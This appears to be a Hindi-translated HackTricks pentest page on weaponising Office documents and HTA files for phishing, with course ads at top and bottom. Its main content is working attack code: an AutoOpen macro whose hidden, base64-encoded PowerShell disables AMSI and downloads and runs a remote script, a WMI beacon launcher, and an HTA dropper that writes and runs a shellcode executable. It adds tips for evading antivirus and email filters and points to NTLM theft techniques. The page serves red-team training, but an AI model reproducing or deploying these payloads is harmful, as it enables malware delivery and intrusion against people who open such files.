# फिशिंग फ़ाइलें और दस्तावेज़

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण देखना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **Twitter** पर **फॉलो** करें 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) पर PR जमा करके**.

</details>

## ऑफिस दस्तावेज़

माइक्रोसॉफ्ट वर्ड फ़ाइल खोलने से पहले फ़ाइल डेटा मान्यता का कार्य करता है। डेटा मान्यता का कार्य डेटा संरचना पहचान, ऑफिसओपनएक्सएमएल मानक के खिलाफ किया जाता है। यदि डेटा संरचना पहचान के दौरान कोई त्रुटि होती है, तो विश्लेषित की जा रही फ़ाइल नहीं खोली जाएगी।

सामान्यत: वर्ड फ़ाइल मैक्रो का उपयोग करने वाली `.docm` एक्सटेंशन का उपयोग करती हैं। हालांकि, फ़ाइल का एक्सटेंशन बदलकर फ़ाइल को नाम बदलना संभव है और फिर भी उनके मैक्रो कार्य क्षमताएँ बनाए रखना संभव है।\
उदाहरण के लिए, एक RTF फ़ाइल मैक्रो का समर्थन नहीं करती है, डिज़ाइन के अनुसार, लेकिन एक DOCM फ़ाइल जिसे RTF में नाम बदल दिया गया होगा, माइक्रोसॉफ्ट वर्ड द्वारा संभाली जाएगी और मैक्रो क्रियान्वयन क्षमताएँ होंगी।\
एक ही आंतरिक और तंत्र टूल्स का उपयोग सभी माइक्रोसॉफ्ट ऑफिस स्वीट (एक्सेल, पावरपॉइंट आदि) पर लागू होता है।

आप निम्नलिखित कमांड का उपयोग कर सकते हैं जिससे आप यह जांच सकते हैं कि कौन सी एक्सटेंशन कुछ ऑफिस कार्यक्रमों द्वारा क्रियान्वित की जाएगी:
```bash
assoc | findstr /i "word excel powerp"
```
### बाहरी छवि लोड

जाएं: _Insert --> Quick Parts --> Field_\
_**श्रेणियाँ**: लिंक और संदर्भ, **फ़ील्ड नाम**: includePicture, और **फ़ाइल का नाम या URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (316).png>)

### मैक्रोस बैकडोर

दस्तावेज से एर्बिट्रे कोड चलाने के लिए मैक्रो का उपयोग संभव है।

#### ऑटोलोड फ़ंक्शन

जितने अधिक सामान्य होते हैं, उतना ही AV उन्हें पहचानेगा।

* AutoOpen()
* Document\_Open()

#### मैक्रो कोड उदाहरण
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### मेटाडेटा को मैन्युअल रूप से हटाएं

**फ़ाइल > सूचना > दस्तावेज़ जांचें > दस्तावेज़ जांचें** पर जाएं, जिससे दस्तावेज़ इंस्पेक्टर खुलेगा। **जांच करें** और फिर **दस्तावेज़ गुण और व्यक्तिगत जानकारी** के पास **सभी हटाएं** पर क्लिक करें।

#### डॉक एक्सटेंशन

समाप्त होने पर, **सेव एस टाइप** ड्रॉपडाउन का चयन करें, **फॉर्मेट** को **`.docx`** से **वर्ड 97-2003 `.doc`** में बदलें।\
इसे इसलिए करें क्योंकि आप **`.docx`** के अंदर मैक्रो सहेज नहीं सकते हैं और मैक्रो-सक्षम **`.docm`** एक्सटेंशन के आसपास एक **कलंक** है (जैसे कि थंबनेल आइकन में एक विशाल `!` होता है और कुछ वेब/ईमेल गेटवे उन्हें पूरी तरह से ब्लॉक कर देते हैं)। इसलिए, यह **पुरानी `.doc` एक्सटेंशन सबसे अच्छा समझौता है**।

#### हानिकारक मैक्रो जेनरेटर

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA फ़ाइलें

एक एचटीए एक विंडोज प्रोग्राम है जो **एचटीए को एचटीए जैसी और जेस्क्रिप्टिंग भाषाओं (जैसे वीबीस्क्रिप्ट और जेस्क्रिप्ट) को संयोजित करता है**। यह उपयोगकर्ता इंटरफ़ेस उत्पन्न करता है और एक "पूरी भरोसा करने योग्य" एप्लिकेशन के रूप में कार्यान्वित होता है, ब्राउज़र की सुरक्षा मॉडल की प्रतिबंधनों के बिना।

एक एचटीए को **`mshta.exe`** का उपयोग करके कार्यान्वित किया जाता है, जो सामान्यत: **इंटरनेट एक्सप्लोरर** के साथ स्थापित होता है, जिससे **`mshta` आईई पर निर्भर होता है**। इसलिए, अगर यह अनइंस्टॉल किया गया है, तो एचटीए कार्यान्वित नहीं हो पाएगा।
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM प्रमाणीकरण को बलपूर्वक करना

कई तरीके हैं **NTLM प्रमाणीकरण "दूरस्थ"** करने के लिए, उदाहरण के लिए, आप ईमेल या HTML में **अदृश्य छवियाँ** जोड़ सकते हैं जिन्हें उपयोगकर्ता तक पहुंचेगा (क्या HTTP MitM?). या पीड़ित को **फ़ाइलों का पता** भेजें जो **फ़ोल्डर खोलने के लिए केवल प्रमाणीकरण** को **सक्रिय** करेगा।

**निम्नलिखित पृष्ठों में इन विचारों की जाँच करें:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM रिले

याद रखें कि आप केवल हैश या प्रमाणीकरण चोरी नहीं कर सकते हैं बल्कि **NTLM रिले हमले** भी कर सकते हैं:

* [**NTLM रिले हमले**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (NTLM रिले से प्रमाणपत्रों तक)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

<details>

<summary><strong>शून्य से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का हैकट्रिक्स में विज्ञापन देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण या हैकट्रिक्स को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जाँच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में PR जमा करके**।

</details>
